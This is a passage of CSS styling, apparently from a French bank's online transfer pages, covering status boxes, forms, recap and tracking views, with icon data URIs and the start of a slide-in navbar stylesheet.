    background: url("data:image/svg+xml;charset=utf8,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2216%22 height=%2218%22 viewBox=%220 0 16 18%22%3E%3Cpath fill=%22%23333%22 fill-rule=%22nonzero%22 d=%22M15.426 6.933a.687.687 0 1 0-1.275.517c.315.79.476 1.626.476 2.488 0 3.681-2.972 6.677-6.626 6.677-3.654 0-6.626-2.996-6.626-6.677 0-3.68 2.972-6.676 6.626-6.676.528 0 1.044.07 1.548.191l-.871.353a.694.694 0 0 0 .256 1.335.674.674 0 0 0 .255-.05l2.58-1.043a.693.693 0 0 0 .381-.9L11.07.435a.686.686 0 0 0-.894-.385.694.694 0 0 0-.382.9l.505 1.27A7.927 7.927 0 0 0 8 1.878c-4.411 0-8 3.617-8 8.061C0 14.384 3.589 18 8 18s8-3.616 8-8.06c0-1.041-.192-2.052-.574-3.007z%22/%3E%3C/svg%3E") no-repeat;
    width: 1.125rem;
    height: 1.125rem; }

.vupri_wrapper .vupri_three_boxes {
  display: flex;
  flex-direction: column;
  margin: 0 auto;
  text-align: center;
  border-radius: .3125rem;
  transition: box-shadow .3s; }
  .vupri_wrapper .vupri_three_boxes--flat {
    margin: 0 auto 1rem; }
    @media only screen and (min-width: 768px) {
      .vupri_wrapper .vupri_three_boxes--flat:hover, .vupri_wrapper .vupri_three_boxes--flat:focus {
        -webkit-box-shadow: none;
        box-shadow: none;
        cursor: pointer; } }
    .vupri_wrapper .vupri_three_boxes--flat .vupri_box {
      padding: 1rem; }
      .vupri_wrapper .vupri_three_boxes--flat .vupri_box:last-child {
        padding-left: 1.5rem; }
      .vupri_wrapper .vupri_three_boxes--flat .vupri_box--simple-grey {
        max-width: 11.25rem;
        padding: 0.5rem 0; }
        .vupri_wrapper .vupri_three_boxes--flat .vupri_box--simple-grey .vupri_box__title {
          display: inline-block;
          width: 100%;
          font-size: 1.125rem; }
          .vupri_wrapper .vupri_three_boxes--flat .vupri_box--simple-grey .vupri_box__title + .vupri_box__status {
            display: inline-block;
            font-size: 0.875rem; }
            .vupri_wrapper .vupri_three_boxes--flat .vupri_box--simple-grey .vupri_box__title + .vupri_box__status:before {
              vertical-align: middle;
              margin-top: -3px; }
        @media only screen and (max-width: 768px) {
          .vupri_wrapper .vupri_three_boxes--flat .vupri_box--simple-grey {
            max-width: inherit;
            padding: 0.5rem 1rem;
            text-align: left; }
            .vupri_wrapper .vupri_three_boxes--flat .vupri_box--simple-grey .vupri_box__title {
              display: inline-block;
              width: 68%; }
              .vupri_wrapper .vupri_three_boxes--flat .vupri_box--simple-grey .vupri_box__title + .vupri_box__status {
                display: inline-block;
                margin: 0; } }
      .vupri_wrapper .vupri_three_boxes--flat .vupri_box:not(.vupri_box--simple-grey) .vupri_box__title {
        max-width: 16.25rem;
        margin-bottom: 0;
        font-size: 1.125rem;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis; }
      @media only screen and (max-width: 768px) {
        .vupri_wrapper .vupri_three_boxes--flat .vupri_box:not(.vupri_box--simple-grey) {
          padding: 0.5rem 0.5rem 0.5rem 1rem; }
          .vupri_wrapper .vupri_three_boxes--flat .vupri_box:not(.vupri_box--simple-grey):last-child {
            padding-top: 1rem; }
          .vupri_wrapper .vupri_three_boxes--flat .vupri_box:not(.vupri_box--simple-grey) .vupri_box__title {
            max-width: 95%;
            font-weight: normal; } }

.vupri_wrapper .vupri_box {
  flex: 1;
  min-height: 4.625rem;
  padding: 0.875rem 1.625rem 0.875rem 1rem;
  text-align: left;
  color: #333;
  background-color: #fff;
  -webkit-border-radius: .3125rem;
  -moz-border-radius: .3125rem;
  border-radius: .3125rem;
  border: 1px solid #d4d4d4;
  z-index: 1; }
  .vupri_wrapper .vupri_box:first-child {
    border-left: 4px solid #80cbc4; }
  .vupri_wrapper .vupri_box:last-child {
    border-left: 4px solid #6badd7; }
  .vupri_wrapper .vupri_box--simple-grey {
    position: relative;
    padding: 1.875rem 1rem 1.25rem;
    margin-top: -0.25rem;
    margin-bottom: -0.25rem;
    text-align: center;
    background-color: #f7f7f7;
    box-shadow: none;
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    border-radius: 0;
    z-index: auto; }
    @media only screen and (max-width: 768px) {
      .vupri_wrapper .vupri_box--simple-grey {
        padding-bottom: 1.0625rem; } }
    .vupri_wrapper .vupri_box--simple-grey:before, .vupri_wrapper .vupri_box--simple-grey:after {
      content: '';
      display: block;
      position: absolute;
      width: 0;
      height: 0;
      left: calc(50% - 1.0625rem);
      border: 0.75rem solid #333;
      border-color: transparent transparent #fff #fff;
      transform-origin: 0 0;
      transform: rotate(-45deg);
      box-shadow: -3px 3px 3px 0 rgba(0, 0, 0, 0.15);
      z-index: 1; }
    .vupri_wrapper .vupri_box--simple-grey:before {
      top: .125rem; }
    .vupri_wrapper .vupri_box--simple-grey:after {
      bottom: -1.125rem;
      border-color: transparent transparent #f7f7f7 #f7f7f7;
      box-shadow: -1px 1px 0px 0px rgba(0, 0, 0, 0.1);
      z-index: 2; }
    .vupri_wrapper .vupri_box--simple-grey .vupri_box__title {
      margin-bottom: 0;
      font-size: 1.5rem;
      font-weight: 600; }
  .vupri_wrapper .vupri_box__title {
    margin-bottom: 0.5rem;
    font-size: 1rem;
    font-weight: 600; }
    @media only screen and (max-width: 768px) {
      .vupri_wrapper .vupri_box__title {
        margin-bottom: 0; } }
  .vupri_wrapper .vupri_box__text {
    font-size: 0.875rem;
    color: #666; }
  .vupri_wrapper .vupri_box__status {
    text-align: center; }
    .vupri_wrapper .vupri_box__status:before {
      content: '';
      display: inline-block;
      width: .75rem;
      height: .75rem;
      margin: 2px 0.5rem 0 0;
      border-radius: 6px;
      background-color: #f5a623; }
    @media only screen and (max-width: 768px) {
      .vupri_wrapper .vupri_box__status {
        margin-bottom: 0.5rem;
        text-align: left;
        text-indent: -1.25em;
        padding-left: 1.25em; } }
    .vupri_wrapper .vupri_box__status--treated:before {
      background-color: #4bb133; }
    .vupri_wrapper .vupri_box__status--refused:before {
      background-color: #e82d50; }
    .vupri_wrapper .vupri_box__status--canceled:before {
      background-color: #dedede; }

.vupri_wrapper.tiers-hero .vupri_three_boxes {
  display: flex;
  flex-direction: column;
  max-width: 40rem;
  margin: 0 auto;
  text-align: center;
  border-radius: 5px;
  transition: .3s box-shadow; }
  .vupri_wrapper.tiers-hero .vupri_three_boxes--flat {
    margin: 0 auto 1.5rem;
    max-width: 48rem; }
    .vupri_wrapper.tiers-hero .vupri_three_boxes--flat:hover, .vupri_wrapper.tiers-hero .vupri_three_boxes--flat:focus, .vupri_wrapper.tiers-hero .vupri_three_boxes--flat:active {
      -webkit-box-shadow: 0 4px 16px 0 rgba(0, 0, 0, 0.2);
      box-shadow: 0 4px 16px 0 rgba(0, 0, 0, 0.2); }
      .vupri_wrapper.tiers-hero .vupri_three_boxes--flat:hover .vupri_box, .vupri_wrapper.tiers-hero .vupri_three_boxes--flat:focus .vupri_box, .vupri_wrapper.tiers-hero .vupri_three_boxes--flat:active .vupri_box {
        border-top-color: transparent;
        border-bottom-color: transparent;
        border-right-color: transparent; }
    .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box {
      position: relative;
      padding: 1rem 1.625rem 0.75rem 1rem; }
      .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box--simple-grey {
        max-width: 11.25rem;
        padding: 0.5rem 0; }
        .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box--simple-grey .vupri_box__title {
          display: inline-block;
          width: 100%;
          font-size: 1rem; }
          .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box--simple-grey .vupri_box__title + .vupri_box__status {
            display: inline-block;
            font-size: 0.875rem; }
            .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box--simple-grey .vupri_box__title + .vupri_box__status:before {
              vertical-align: middle;
              margin-top: -3px; }
        @media only screen and (max-width: 768px) {
          .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box--simple-grey {
            max-width: inherit;
            padding: 0.5rem 1rem;
            text-align: left; }
            .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box--simple-grey .vupri_box__title {
              display: inline-block;
              width: 68%; }
              .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box--simple-grey .vupri_box__title + .vupri_box__status {
                display: inline-block;
                margin: 0; } }
      .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box:not(.vupri_box--simple-grey) .vupri_box__title {
        display: inline-block;
        width: 50%;
        max-width: none;
        margin-bottom: 0.25rem;
        vertical-align: middle;
        font-size: 1.125rem;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis; }
        @media only screen and (max-width: 768px) {
          .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box:not(.vupri_box--simple-grey) .vupri_box__title {
            font-size: 1rem;
            font-weight: 600; } }
        .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box:not(.vupri_box--simple-grey) .vupri_box__title--amount {
          width: 50%;
          font-size: 1.25rem;
          text-align: right; }
          .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box:not(.vupri_box--simple-grey) .vupri_box__title--amount-positif {
            color: #5e8b54; }
      .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box:not(.vupri_box--simple-grey) .vupri_box__information {
        position: relative;
        margin-bottom: 1.1875rem;
        font-size: 0.875rem;
        color: #666; }
        .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box:not(.vupri_box--simple-grey) .vupri_box__information--bold {
          font-weight: 600; }
        .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box:not(.vupri_box--simple-grey) .vupri_box__information--mob, .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box:not(.vupri_box--simple-grey) .vupri_box__information--bold {
          color: #333; }
        @media only screen and (max-width: 768px) {
          .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box:not(.vupri_box--simple-grey) .vupri_box__information {
            max-width: 50%;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis; } }
      .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box:not(.vupri_box--simple-grey) .vupri_box__separator {
        display: inline-block;
        margin: 0 0.5rem; }
        .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box:not(.vupri_box--simple-grey) .vupri_box__separator:after {
          content: "";
          position: absolute;
          height: 17px;
          top: 50%;
          transform: translateY(-50%);
          border: 0.5px solid #333; }
      .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box:not(.vupri_box--simple-grey) .vupri_box__recap {
        display: flex;
        position: relative;
        font-size: 0.75rem;
        line-height: 1; }
        @media only screen and (max-width: 768px) {
          .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box:not(.vupri_box--simple-grey) .vupri_box__recap {
            flex-direction: column; }
            .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box:not(.vupri_box--simple-grey) .vupri_box__recap .vupri_box__date {
              margin: 0.375rem 0 0 0.875rem; } }
      .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box:not(.vupri_box--simple-grey) .vupri_box__date {
        margin-left: 1.5rem; }
      .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box:not(.vupri_box--simple-grey) .vupri_box__status {
        display: flex;
        align-items: center;
        text-align: right; }
        .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box:not(.vupri_box--simple-grey) .vupri_box__status:before {
          margin: 0 0.25rem 0 0;
          vertical-align: middle; }
      @media only screen and (max-width: 768px) {
        .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box:not(.vupri_box--simple-grey) {
          padding: .75rem .625rem; }
          .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box:not(.vupri_box--simple-grey) .vupri_box__title {
            max-width: 95%; }
          .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box:not(.vupri_box--simple-grey) .vupri_box__information:after {
            width: inherit;
            left: 0;
            right: 0; }
          .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box:not(.vupri_box--simple-grey) .vupri_box__separator {
            display: none; }
          .vupri_wrapper.tiers-hero .vupri_three_boxes--flat .vupri_box:not(.vupri_box--simple-grey) .vupri_box__status {
            margin-bottom: 0;
            padding-right: 0; } }

.vupri_wrapper.tiers-hero .vupri_box {
  flex: 1;
  min-height: 4.625rem;
  padding: 0.875rem 1.625rem 0.875rem 1rem;
  text-align: left;
  color: #333;
  background-color: #fff;
  -webkit-border-radius: .3125rem;
  -moz-border-radius: .3125rem;
  border-radius: .3125rem;
  border: 1px solid #d4d4d4;
  z-index: 1; }
  .vupri_wrapper.tiers-hero .vupri_box:first-child {
    border-radius: 5px 0 0 5px;
    border-left: 4px solid #333; }
  .vupri_wrapper.tiers-hero .vupri_box:last-child {
    border-radius: 5px;
    border-left: 4px solid #333; }
  @media only screen and (max-width: 768px) {
    .vupri_wrapper.tiers-hero .vupri_box {
      padding: .75rem; }
      .vupri_wrapper.tiers-hero .vupri_box:first-child {
        border-radius: 5px;
        border-top: 1px solid #dedede;
        border-right: 1px solid #dedede;
        border-left: 4px solid #333; }
      .vupri_wrapper.tiers-hero .vupri_box:last-child {
        border-radius: 5px;
        border-left: 4px solid #333; }
      .vupri_wrapper.tiers-hero .vupri_box .vupri_box__recap:before {
        width: inherit;
        left: 0;
        right: 0; } }
  .vupri_wrapper.tiers-hero .vupri_box--simple-grey {
    position: relative;
    padding: 1.875rem 1rem 0;
    text-align: center;
    background-color: #f7f7f7; }
    @media only screen and (max-width: 768px) {
      .vupri_wrapper.tiers-hero .vupri_box--simple-grey {
        padding-bottom: 1.0625rem; } }
    .vupri_wrapper.tiers-hero .vupri_box--simple-grey:before, .vupri_wrapper.tiers-hero .vupri_box--simple-grey:after {
      content: '';
      display: block;
      position: absolute;
      width: 0;
      height: 0;
      left: calc(50% - 1.0625rem);
      border: 0.75rem solid #333;
      border-color: transparent transparent #fff #fff;
      transform-origin: 0 0;
      transform: rotate(-45deg);
      box-shadow: -3px 3px 3px 0 rgba(0, 0, 0, 0.15);
      z-index: 1; }
    .vupri_wrapper.tiers-hero .vupri_box--simple-grey:before {
      top: .125rem; }
    .vupri_wrapper.tiers-hero .vupri_box--simple-grey:after {
      bottom: -1.125rem;
      border-color: transparent transparent #f7f7f7 #f7f7f7;
      box-shadow: -1px 1px 0px 0px rgba(0, 0, 0, 0.1);
      z-index: 2; }
    .vupri_wrapper.tiers-hero .vupri_box--simple-grey .vupri_box__title {
      margin-bottom: 0;
      font-size: 1.5rem;
      font-weight: 600; }
  .vupri_wrapper.tiers-hero .vupri_box__title {
    margin-bottom: 0.5rem;
    font-size: 1rem;
    font-weight: 600;
    line-height: 1; }
    @media only screen and (max-width: 768px) {
      .vupri_wrapper.tiers-hero .vupri_box__title {
        margin-bottom: 0; } }
  .vupri_wrapper.tiers-hero .vupri_box__text {
    font-size: 0.875rem;
    color: #666; }
  .vupri_wrapper.tiers-hero .vupri_box__status {
    text-align: center;
    font-weight: 600; }
    .vupri_wrapper.tiers-hero .vupri_box__status:before {
      content: '';
      display: inline-block;
      width: .75rem;
      height: .75rem;
      margin: 2px 0.5rem 0 0;
      border-radius: 6px;
      background-color: #f5a623; }
    .vupri_wrapper.tiers-hero .vupri_box__status--treated:before {
      background-color: #4bb133; }
    .vupri_wrapper.tiers-hero .vupri_box__status--refused:before {
      background-color: #e82d50; }
    .vupri_wrapper.tiers-hero .vupri_box__status--canceled:before {
      background-color: #dedede; }
    @media screen and (max-width: 768px) {
      .vupri_wrapper.tiers-hero .vupri_box__status {
        text-indent: 0;
        padding-left: 0; } }
  .vupri_wrapper.tiers-hero .vupri_box__footer {
    display: flex;
    justify-content: space-between;
    align-items: center; }
    @media screen and (max-width: 768px) {
      .vupri_wrapper.tiers-hero .vupri_box__footer {
        align-items: flex-end; } }

.vupri_wrapper .vupri_btns_container {
  margin-bottom: 1.5rem; }
  @media only screen and (max-width: 768px) {
    .vupri_wrapper .vupri_btns_container {
      margin: 0; } }

.vupri_wrapper .vupri_btn_container {
  display: inline-block;
  vertical-align: top;
  line-height: 2.3; }

.vupri_wrapper .vupri_alertbox--info_in_form {
  margin-left: 0;
  padding: 0 0 0 50px;
  min-height: 46px;
  background: no-repeat 0 center/34px;
  background-image: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/d2fc008db6456447666547b7962d10b3.png);
  border: none; }
  @media only screen and (max-width: 768px) {
    .vupri_wrapper .vupri_alertbox--info_in_form .vupri_alertbox__message {
      text-align: left; } }

.vupri_wrapper .vupri_alertbox.alertbox-info-ip {
  display: none;
  margin-bottom: 2rem; }
  @media only screen and (max-width: 768px) {
    .vupri_wrapper .vupri_alertbox.alertbox-info-ip {
      border-bottom: 0; } }

.vupri_wrapper .vupri_form {
  max-width: 768px;
  padding: 0 0 2rem;
  margin: 0 auto; }
  @media only screen and (max-width: 768px) {
    .vupri_wrapper .vupri_form {
      padding: 1rem; } }
  .vupri_wrapper .vupri_form .vupri_btn_container {
    text-align: center; }
  .vupri_wrapper .vupri_form fieldset,
  .vupri_wrapper .vupri_form .vupri_btn_container {
    width: 100%; }
  @media only screen and (max-width: 768px) {
    .vupri_wrapper .vupri_form fieldset {
      min-width: 0; } }
  .vupri_wrapper .vupri_form fieldset:last-of-type {
    max-width: inherit; }
  .vupri_wrapper .vupri_form fieldset:nth-of-type(1) .vupri_btn {
    float: right;
    margin: -7px 0 4.5rem; }
  .vupri_wrapper .vupri_form .vupri_super-select {
    margin-bottom: 2rem; }
  .vupri_wrapper .vupri_form #beneficiaires .vupri_super-select {
    margin-bottom: 2.5rem; }
  .vupri_wrapper .vupri_form .vupri_select {
    margin-bottom: 2rem; }
    .vupri_wrapper .vupri_form .vupri_select__list {
      overflow: hidden; }
  .vupri_wrapper .vupri_form .vupri_select--small {
    float: left;
    width: 9.25rem;
    height: 2.5rem;
    margin-left: 1.625rem; }
    @media only screen and (max-width: 768px) {
      .vupri_wrapper .vupri_form .vupri_select--small {
        float: none;
        width: 100%;
        margin-left: 0; } }
  .vupri_wrapper .vupri_form__legend {
    margin-bottom: 38px;
    font-size: 1.3125em;
    font-weight: 600;
    color: #333; }
  .vupri_wrapper .vupri_form .vupri_input--medium {
    width: 58.22%; }
  .vupri_wrapper .vupri_form .vupri_input--small {
    clear: both;
    width: 50.6%; }
  .vupri_wrapper .vupri_form .vupri_input__label--small {
    color: #999;
    font-size: 0.75rem;
    font-weight: normal; }
  .vupri_wrapper .vupri_form .vupri_input--calendar .vupri_input__field {
    color: #333;
    -webkit-text-fill-color: #333; }
    .vupri_wrapper .vupri_form .vupri_input--calendar .vupri_input__field.calendar-only:disabled ~ .vupri_input__icon {
      background-position: -4.875rem 0; }
  .vupri_wrapper .vupri_form .vupri_input:hover .vupri_input__field.calendar-only:disabled ~ .vupri_input__icon, .vupri_wrapper .vupri_form .vupri_input:focus .vupri_input__field.calendar-only:disabled ~ .vupri_input__icon {
    background-position: -4.875rem -1.625rem; }
  .vupri_wrapper .vupri_form .vupri_input.nom-benef {
    float: left;
    margin-bottom: 2.5rem; }
  .vupri_wrapper .vupri_form .vupri_input.montant {
    float: left;
    width: 10.3125rem;
    min-height: inherit; }
    .vupri_wrapper .vupri_form .vupri_input.montant .vupri_input__msg {
      margin-bottom: 2rem; }
  @media only screen and (max-width: 768px) {
    .vupri_wrapper .vupri_form .vupri_input.nom-benef, .vupri_wrapper .vupri_form .vupri_input.montant {
      float: none;
      width: 100%; }
    .vupri_wrapper .vupri_form .vupri_input.montant {
      margin-bottom: 2rem; }
      .vupri_wrapper .vupri_form .vupri_input.montant .vupri_input__msg {
        margin-bottom: 0.5rem; }
    .vupri_wrapper .vupri_form .vupri_input--small {
      width: 100%; } }
  .vupri_wrapper .vupri_form .vupri_input.motif {
    clear: left;
    width: 21.25rem;
    margin-bottom: 1.5rem; }
    @media only screen and (max-width: 768px) {
      .vupri_wrapper .vupri_form .vupri_input.motif {
        width: 100%; } }
  .vupri_wrapper .vupri_form .vupri_link.benef-sbm {
    display: block;
    margin: -2rem 0 3rem; }
  .vupri_wrapper .vupri_form .vupri_vignette_container {
    margin-bottom: 2rem; }
  .vupri_wrapper .vupri_form .vupri_vignette .vupri_input {
    min-height: inherit;
    margin-bottom: 0; }
  .vupri_wrapper .vupri_form .vupri_vignette .vupri_select__list {
    overflow: auto; }
  .vupri_wrapper .vupri_form .vupri_input__field.is-valid ~ .vupri_input__icon {
    background: url("data:image/svg+xml;charset=utf8,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2221%22 height=%2216%22 viewBox=%220 0 21 16%22%3E%3Cpath fill=%22%233AC596%22 fill-rule=%22nonzero%22 d=%22M3.839 5.82a1.073 1.073 0 0 0-1.532 1.503l6.2 6.26c.42.43 1.11.43 1.53.001l9.656-9.76a1.073 1.073 0 1 0-1.531-1.503l-8.89 8.98-5.433-5.48z%22/%3E%3C/svg%3E") no-repeat;
    width: 1.25rem;
    height: 0.875rem;
    top: .8125rem;
    right: 0; }
  .vupri_wrapper .vupri_form .vupri_select__toggle {
    padding-right: 0; }
    .vupri_wrapper .vupri_form .vupri_select__toggle::before {
      width: 1.25rem;
      height: .75rem;
      margin-top: 0.5rem;
      background-position: -6.6875rem -2.0625rem; }

.vupri_wrapper .vupri_recap {
  padding: 0.5rem 0 2rem;
  text-align: center;
  max-width: 40rem;
  margin: 0 auto; }
  @media only screen and (max-width: 768px) {
    .vupri_wrapper .vupri_recap {
      padding: 2rem 1rem; } }
  .vupri_wrapper .vupri_recap .vupri_btns_container {
    max-width: 660px;
    margin: 0 auto 1.5rem;
    text-align: center;
    overflow: hidden; }
    .vupri_wrapper .vupri_recap .vupri_btns_container ~ .vupri_link {
      margin-top: 2rem; }
    @media only screen and (max-width: 768px) {
      .vupri_wrapper .vupri_recap .vupri_btns_container {
        display: flex;
        flex-direction: column-reverse; }
        .vupri_wrapper .vupri_recap .vupri_btns_container .vupri_btn_container {
          margin-top: 0; }
        .vupri_wrapper .vupri_recap .vupri_btns_container .vupri_btn--ghost-dark {
          margin-top: 1.5rem; }
        .vupri_wrapper .vupri_recap .vupri_btns_container.recap-btns {
          max-width: 320px;
          display: flex;
          flex-direction: column-reverse; }
          .vupri_wrapper .vupri_recap .vupri_btns_container.recap-btns .vupri_btn ~ .vupri_btn_container {
            margin: 0 0 1rem; } }
  .vupri_wrapper .vupri_recap .vupri_btn {
    margin: 0 auto; }
    .vupri_wrapper .vupri_recap .vupri_btn ~ span {
      margin-top: 13px; }
      .vupri_wrapper .vupri_recap .vupri_btn ~ span:before {
        content: '';
        display: inline-block;
        vertical-align: middle;
        position: relative;
        top: -1px;
        width: 18px;
        height: 18px;
        margin-right: 4px;
        background-image: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/c0d2bf8151c11eb2426a16dc2a38625a.png);
        background-repeat: no-repeat;
        background-position: -4px -56px;
        background-size: 156px 78px; }
  .vupri_wrapper .vupri_recap .vupri_btn_container span {
    display: block;
    clear: right;
    margin-top: 3px;
    text-align: center; }
  .vupri_wrapper .vupri_recap .vupri_link {
    font-size: 1rem; }
    .vupri_wrapper .vupri_recap .vupri_link__cancel {
      margin: 1.5rem 0 1rem; }
  .vupri_wrapper .vupri_recap__status {
    font-size: 1.125rem;
    text-align: center;
    color: #333;
    margin-bottom: 1rem; }
    .vupri_wrapper .vupri_recap__status:before {
      content: '';
      display: inline-block;
      width: 12px;
      height: 12px;
      margin: 2px 0.5rem 0 0;
      border-radius: 6px;
      background-color: #f5a623; }
    @media only screen and (max-width: 768px) {
      .vupri_wrapper .vupri_recap__status {
        margin-bottom: 1rem;
        font-size: 1rem;
        text-indent: -1.25em;
        padding-left: 1.25em; } }
    .vupri_wrapper .vupri_recap__status--treated:before {
      background-color: #4bb133; }
    .vupri_wrapper .vupri_recap__status--refused:before {
      background-color: #e82d50; }
    .vupri_wrapper .vupri_recap__status--canceled:before {
      background-color: #dedede; }
  .vupri_wrapper .vupri_recap .vupri_printing {
    text-align: right;
    margin-bottom: 1.5rem; }
    @media only screen and (max-width: 768px) {
      .vupri_wrapper .vupri_recap .vupri_printing {
        padding-right: 0; } }
  .vupri_wrapper .vupri_recap .vupri_box {
    border-top: 0;
    border-bottom: 0;
    border-right: 0;
    box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.3); }
    .vupri_wrapper .vupri_recap .vupri_box--simple-grey {
      -webkit-box-shadow: none;
      -moz-box-shadow: none;
      box-shadow: none;
      border: 0; }
    @media only screen and (max-width: 768px) {
      .vupri_wrapper .vupri_recap .vupri_box:first-child {
        padding-top: 1.1875rem;
        padding-bottom: 1.1875rem; }
      .vupri_wrapper .vupri_recap .vupri_box:last-child {
        padding-top: 1.5rem;
        padding-bottom: 0.875rem; }
      .vupri_wrapper .vupri_recap .vupri_box__text {
        margin-top: 0.25rem; } }

.vupri_wrapper .vupri_three_boxes + .vupri_details_list {
  margin: 0.5rem 0 2rem; }

.vupri_wrapper .vupri_details_list {
  max-width: 768px;
  margin: 0 auto 1rem; }
  .vupri_wrapper .vupri_details_list__item {
    padding: 1rem 0;
    font-size: 1.125rem;
    overflow: hidden; }
    .vupri_wrapper .vupri_details_list__item:not(:last-child) {
      border-bottom: 1px solid #dedede; }
    .vupri_wrapper .vupri_details_list__item span {
      float: left; }
      .vupri_wrapper .vupri_details_list__item span + span {
        max-width: 82%;
        float: right;
        font-weight: 600;
        text-align: right; }
  @media only screen and (max-width: 768px) {
    .vupri_wrapper .vupri_details_list {
      max-width: 480px;
      margin: 0 auto; }
      .vupri_wrapper .vupri_details_list__item {
        justify-content: space-between; }
        .vupri_wrapper .vupri_details_list__item span {
          font-size: 1rem; } }

.vupri_wrapper .clavierVirtuelWrapper {
  margin-bottom: 16px; }

.vupri_wrapper .vupri_disclaimer {
  max-width: 768px;
  margin: 2rem auto 3rem;
  text-align: left; }
  .vupri_wrapper .vupri_disclaimer .vupri_title {
    margin-bottom: 0.5rem;
    text-align: left;
    font-size: 0.875rem;
    font-weight: 600; }
  .vupri_wrapper .vupri_disclaimer .vupri_para {
    margin-bottom: 1rem;
    text-align: justify;
    font-size: 0.75rem;
    line-height: 1.5; }
  @media only screen and (max-width: 768px) {
    .vupri_wrapper .vupri_disclaimer .vupri_title {
      margin-left: 0; } }

@media only screen and (max-width: 768px) {
  .vupri_wrapper .vupri_alertbox .vupri_btn + .vupri_btn {
    margin-left: 0; } }

.vupri_wrapper .vupri_tracking {
  max-width: 48rem;
  padding: 0 0 2rem;
  margin: 0 auto; }
  .vupri_wrapper .vupri_tracking__title {
    margin-bottom: 0.5rem;
    font-weight: 600;
    color: #666; }
    .vupri_wrapper .vupri_tracking__title:not(:first-child) {
      margin-top: 1.5rem; }
  .vupri_wrapper .vupri_tracking .vupri_box {
    min-height: 6.8125rem; }
  @media only screen and (max-width: 768px) {
    .vupri_wrapper .vupri_tracking {
      max-width: 32rem;
      padding: 1rem; } }

.awt--ngim .vupri_wrapper .boutonsVirements {
  padding: 0px;
  list-style: none outside none;
  width: 100%;
  overflow: hidden;
  text-align: center;
  border-bottom: 1px solid #ccc; }

.awt--ngim .vupri_wrapper .boutonsVirements li {
  display: inline-block;
  position: relative;
  margin: 0 !important;
  float: none !important;
  padding: 1rem 1rem 0.5rem 1rem;
  text-transform: uppercase; }

.awt--ngim .vupri_wrapper .boutonsVirements li a {
  text-transform: uppercase; }

.awt--ngim .vupri_wrapper .itemVirement {
  padding: 0;
  width: 100% !important;
  color: #333 !important;
  font-family: 'sourcesanspro', sans-serif;
  font-size: 1rem;
  font-weight: 600;
  background: none; }

.awt--ngim .vupri_wrapper .itemVirement.itemVirementActif:after,
.awt--ngim .vupri_wrapper .boutonsVirements li a:hover:after {
  content: '';
  position: absolute;
  display: block;
  width: 50%;
  height: 2px;
  left: 50%;
  bottom: -0.25rem;
  transform: translateX(-50%);
  background-color: #f05b6f; }

.awt--ngim .vupri_wrapper .itemVirement.itemVirementBorder {
  border: 0; }
</style><style type="text/css">.mfbSlide-in-right .mfbNavbarContent{-webkit-transform:translateX(100%);-moz-transform:translateX(100%);-ms-transform:translateX(100%);transform:translateX(100%);-webkit-transition:all 1s;-moz-transition:all 0.2s;transition:all 0.2s;transition-delay:1s;opacity:0}.mfbSlide-in-left .mfbNavbarContent{-webkit-transform:translateX(-100%);-moz-transform:translateX(-100%);-ms-transform:translateX(-100%);transform:translateX(-100%);-webkit-transition:all 0.2s;-moz-transition:all 0.2s;transition:all 0.2s;transition-delay:1s;opacity:0}.mfbSlide-in-bottom .mfbNavbarContent{-webkit-transform:translateY(100%);-moz-transform:translateY(100%);-ms-transform:translateY(100%);transform:translateY(100%);-webkit-transition:all 0.2s;-moz-transition:all 0.2s;transition:all 0.2s;transition-delay:0.2s;opacity:0}.mfbSlide-in-top .mfbNavbarContent{-webkit-transform:translateY(-100%);-moz-transform:translateY(-100%);-ms-transform:translateY(-100%);transform:translateY(-100%);-webkit-transition:all 0.2s;-moz-transition:all 0.2s;transition:all 0.2s;transition-delay:0.2s;opacity:0}.mfbVisible.mfbSlide-in-left .mfbNavbarContent,.mfbVisible.mfbSlide-in-right .mfbNavbarContent{-webkit-transform:translateX(0);-moz-transform:translateX(0);-ms-transform:translateX(0);transform:translateX(0);-webkit-transition:all 0.2s;-moz-transition:all 0.2s;transition:all 0.2s;opacity:1}.mfbVisible.mfbSlide-in-bottom .mfbNavbarContent,.mfbVisible.mfbSlide-in-top 